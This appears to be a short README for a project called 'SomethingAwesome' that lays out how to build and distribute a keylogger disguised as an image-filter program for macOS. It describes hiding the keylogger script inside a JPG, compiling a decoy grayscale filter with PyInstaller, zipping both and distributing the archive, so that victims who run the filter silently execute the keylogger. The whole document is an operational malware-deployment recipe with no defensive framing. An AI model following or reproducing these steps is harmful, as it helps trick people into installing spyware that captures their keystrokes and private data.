# SomethingAwesome
To create the keylogger package:

1. Embed the keylogger script into a JPG image using encode.py.
2. Convert filter.py to an executable using PyInstaller or a similar tool.
3. Create a ZIP archive containing the encoded image and the filter executable.
4. Distributing the ZIP archive is the final step in deploying the keylogger.

When the user runs the filter executable, it will apply a simple grayscale filter to the image as a decoy activity while silently extracting and executing the embedded keylogger script in the background.

Please note that the filter.py script must be converted to an executable on a macOS system to be compatible with the target environment.
